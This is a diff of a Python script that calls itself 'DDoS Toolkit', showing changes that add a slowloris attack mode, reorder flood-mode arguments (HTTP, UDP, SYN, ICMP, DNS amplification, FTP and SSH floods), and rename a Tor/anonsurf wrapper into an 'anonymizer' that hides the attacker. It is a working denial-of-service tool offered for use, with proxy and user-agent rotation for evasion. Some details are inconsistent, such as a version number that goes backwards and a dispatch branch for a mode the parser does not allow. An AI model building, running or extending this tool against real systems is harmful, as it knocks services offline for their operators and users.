@@ -15,36 +15,37 @@
 ### END INIT INFO
 
 # ================== Standard Libraries ===================
-import aiohttp  # Asynchronous HTTP requests for attack simulation.
-import asyncio  # Event loop for handling async tasks.
-import time  # Timing functions for attack intervals.
-import argparse  # Parsing command-line arguments.
-import threading  # Multithreading for concurrent attacks.
-from concurrent.futures import ThreadPoolExecutor, as_completed  # Managing parallel tasks.
-import random  # Randomization for payloads and attack patterns.
-import json  # Handling JSON configuration and outputs.
-from itertools import cycle  # Cycling iterators for proxy rotation.
-from collections import deque  # Efficient data handling for queues.
-from uuid import uuid4  # Unique identifiers for attack instances.
-from base64 import b64encode  # Encoding payloads for attacks.
-import hashlib  # Generating checksums for data integrity.
-import zlib  # Compressing data for payload optimization.
-import hmac  # Creating secure message digests.
-import signal  # Managing process signals (e.g., interruptions).
-import sys  # System-level functions (e.g., exiting on error).
-import os  # Operating system-level operations.
-import subprocess  # Running external commands/tools.
+import aiohttp # Asynchronous HTTP requests for attack simulation.
+import asyncio # Event loop for handling async tasks.
+import time # Timing functions for attack intervals.
+import argparse # Parsing command-line arguments.
+import threading # Multithreading for concurrent attacks.
+from concurrent.futures import ThreadPoolExecutor, as_completed # Managing parallel tasks.
+import random # Randomization for payloads and attack patterns.
+import json # Handling JSON configuration and outputs.
+from itertools import cycle # Cycling iterators for proxy rotation.
+from collections import deque # Efficient data handling for queues.
+from uuid import uuid4 # Unique identifiers for attack instances.
+from base64 import b64encode # Encoding payloads for attacks.
+import hashlib # Generating checksums for data integrity.
+import zlib # Compressing data for payload optimization.
+import hmac # Creating secure message digests.
+import signal # Managing process signals (e.g., interruptions).
+import sys # System-level functions (e.g., exiting on error).
+import os # Operating system-level operations.
+import subprocess # Running external commands/tools.
 import socket  # Creating and managing socket connections.
 import struct  # Handling low-level data structures.
-import logging  # Logging attack progress and errors.
+import logging # Logging attack progress and errors.
 import psutil  # Monitoring system resource usage.
+import shutil  # File operations (copy, move, execute, etc.)
 
 # ================== Third-Party Libraries ==================
-import scapy.all as scapy  # Crafting and analyzing packets.
-import dns.resolver  # Resolving DNS queries for amplification.
-from colorama import init, Fore, Style  # Adding color to console outputs.
-from tqdm import tqdm  # Displaying progress bars during attacks.
-import openai  # Integrating AI-based suggestions for optimizations.
+import scapy.all as scapy # Crafting and analyzing packets.
+import dns.resolver # Resolving DNS queries for amplification.
+from colorama import init, Fore, Style # Adding color to console outputs.
+from tqdm import tqdm # Displaying progress bars during attacks.
+import openai # Integrating AI-based suggestions for optimizations.
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -62,6 +63,7 @@ failed_requests = 0
 last_time = time.time()
 requests_lock = threading.Lock()
 rps_history = deque(maxlen=60)
+stop_event = threading.Event()
 
 # User-Agent list
 USER_AGENTS = [
@@ -88,38 +90,38 @@ logging.basicConfig(
 def display_banner():
     print(f"""
 {BLUE}
-████████████████████████████████████████████████████████
-██                                                             ██
-██             DDoS Toolkit v2.1 Coded by LIONMAD              ██
-██        USE WITH CAUTION, PROCEED AT YOUR OWN RISK.          ██                                  
-██                LIONMAD SALUTES YOU LIONMAD                  ██
-██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
-██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
-██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
-██                                                             ██
-████████████████████████████████████████████████████████
+███████████████████████████████████████████████████████
+██                                                   ██
+██         DDoS Toolkit v2.0 Coded by LIONMAD        ██
+██     USE WITH CAUTION, PROCEED AT YOUR OWN RISK.   ██                                  
+██             LIONMAD SALUTES YOU LIONMAD           ██
+██     LIONMAD SALUTES YOU      LIONMAD SALUTES YOU  ██
+██     LIONMAD SALUTES YOU      LIONMAD SALUTES YOU  ██
+██     LIONMAD SALUTES YOU      LIONMAD SALUTES YOU  ██
+██                                                   ██
+███████████████████████████████████████████████████████
 {RESET}
 """)
 
 def parse_args():
     """Parse command-line arguments."""
-    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.1 Coded By LIONBAD")
+    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.0 Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
+    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
+    parser.add_argument("-r", "--rate-limit", type=int, default=100, help="Rate limit for requests per second")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
     parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
+    parser.add_argument("--anonymizer", choices=["start", "stop"], help="Enable or disable anonymizer for anonymity")
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
-    parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
-    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
-    parser.add_argument("--user-agents", help="File containing custom user-agent strings")
-    parser.add_argument("--multi-target", help="File containing multiple target URLs or IPs")
-    parser.add_argument("--ai-optimization", action="store_true", help="Enable AI-powered optimization")
-    parser.add_argument("--tor", action="store_true", help="Enable Tor using anonsurf for anonymity")
+    parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
+    parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
+    parser.add_argument("-ai", "--ai-optimization", action="store_true", help="Enable AI-powered optimization")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -169,7 +171,7 @@ async def check_proxy_health(proxy: str):
 
 async def monitor_proxy_health(proxies):
     """Continuously monitor the health of proxies."""
-    while True:
+    while not stop_event.is_set():
         for proxy in proxies:
             if not await check_proxy_health(proxy):
                 proxies.remove(proxy)
@@ -233,47 +235,55 @@ def run_network_scanner(target_ip):
     except Exception as e:
         print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
 
-def run_anonsurf(mode):
-    """Run the anonsurf script with error handling and validation."""
+def run_anonymizer(mode):
+    """Run the anonymizer script with error handling and validation."""
     try:
-        # Define the main directory for anonsurf
-        anonsurf_path = "/opt/DDoS-Toolkit/assets/anonsurf"
+        # Define the main directory for anonymizer
+        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
         
-        # Check if anonsurf exists in the defined directory
-        if not os.path.isfile(anonsurf_path):
-            print(f"{RED}[ERROR] anonsurf script not found in {anonsurf_path}. Aborting.{RESET}")
-            return
+        # Check if anonymizer exists in the defined directory
+        if not os.path.isfile(anonymizer_path):
+            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
+            sys.exit(1)  # Exit the script
         
         # Validate the mode
         if mode not in ["start", "stop"]:
             print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
-            return
+            sys.exit(1)  # Exit the script
         
         # Build the command
-        command = ["bash", anonsurf_path, mode]
+        command = ["bash", anonymizer_path, mode]
         
         # Notify user about the action
         action_message = "Starting" if mode == "start" else "Stopping"
-        print(f"{BLUE}[INFO] {action_message} anonsurf...{RESET}")
+        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
         
         # Execute the command
         result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
         # Check command result
         if result.returncode == 0:
-            print(f"{GREEN}[SUCCESS] anonsurf {mode} completed successfully!{RESET}")
+            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
         else:
-            print(f"{RED}[ERROR] anonsurf {mode} failed with return code {result.returncode}.{RESET}")
+            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
             print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
+            sys.exit(1)  # Exit the script on failure
     
     except FileNotFoundError:
         print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
+        sys.exit(1)  # Exit the script
+    
     except subprocess.SubprocessError as e:
         print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
+        sys.exit(1)  # Exit the script
+    
     except Exception as e:
         print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
+        sys.exit(1)  # Exit the script
+    
     finally:
-        print(f"{BLUE}[INFO] Exiting anonsurf handler.{RESET}")
+        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
+        sys.exit(0)  # Exit the script after completion
         
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
@@ -327,6 +337,42 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                                     successful_requests += 1
                                 else:
                                     failed_requests += 1
+                        break  # Exit retry loop if request succeeds
+                    except aiohttp.ClientError as e:
+                        with requests_lock:
+                            failed_requests += 1
+                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
+                    except Exception as e:
+                        with requests_lock:
+                            failed_requests += 1
+                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
+                await asyncio.sleep(pause_time)
+
+async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
+    """Perform a Slowloris attack by keeping many connections open."""
+    global requests_sent, successful_requests, failed_requests
+    proxy_pool = cycle(proxies) if proxies else None
+    semaphore = asyncio.Semaphore(rate_limit)
+
+    if not target_url.startswith(("http://", "https://")):
+        target_url = f"http://{target_url}"
+
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            async with semaphore:
+                for attempt in range(retry):
+                    try:
+                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
+                        # Send a partial HTTP request
+                        async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
+                            with requests_lock:
+                                requests_sent += 1
+                                if response.status in [200, 201, 204]:
+                                    successful_requests += 1
+                                else:
+                                    failed_requests += 1
+                        # Keep the connection open by sending partial data
+                        await asyncio.sleep(pause_time)
                         break  # Exit retry loop if request succeeds
                     except aiohttp.ClientError as e:
                         with requests_lock:
@@ -499,7 +545,9 @@ def calculate_rps_stats():
 
 def signal_handler(sig, frame):
     """Handle interrupt signals."""
+    global stop_event
     print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
+    stop_event.set()  # Signal all threads to stop
     sys.exit(0)
 
 def get_ai_suggestion():
@@ -561,10 +609,10 @@ async def main():
 
     display_banner()
 
-    # If --tor is provided, start anonsurf
-    if args.tor:
-        print(f"{BLUE}[INFO] Starting Tor via anonsurf...{RESET}")
-        run_anonsurf("start")
+    # If --anonymizer is provided, start or stop anonymizer
+    if args.anonymizer:
+        print(f"{BLUE}[INFO] {'Starting' if args.anonymizer == 'start' else 'Stopping'} anonymizer...{RESET}")
+        run_anonymizer(args.anonymizer)
 
     # If --scan is provided, perform the scan and exit
     if args.scan:
@@ -611,6 +659,10 @@ async def main():
         target_ip = await resolve_target(target)
         target_port = 22  # Default port for SSH
         threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "slowloris":
+        for _ in range(args.threads):
+            task = asyncio.create_task(slowloris_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
+            tasks.append(task)
     elif args.attack_mode == "http2-flood":
         for _ in range(args.threads):
             task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
@@ -641,10 +693,10 @@ async def main():
     if args.ai_optimization:
         adjust_parameters_based_on_feedback()
 
-    # If --tor is provided, stop anonsurf after the attack
-    if args.tor:
-        print(f"{BLUE}[INFO] Stopping Tor via anonsurf...{RESET}")
-        run_anonsurf("stop")
+    # If --anonymizer is provided, stop anonymizer after the attack
+    if args.anonymizer == "start":
+        print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
+        run_anonymizer("stop")
 
 if __name__ == "__main__":
     # Handle signals for graceful exit
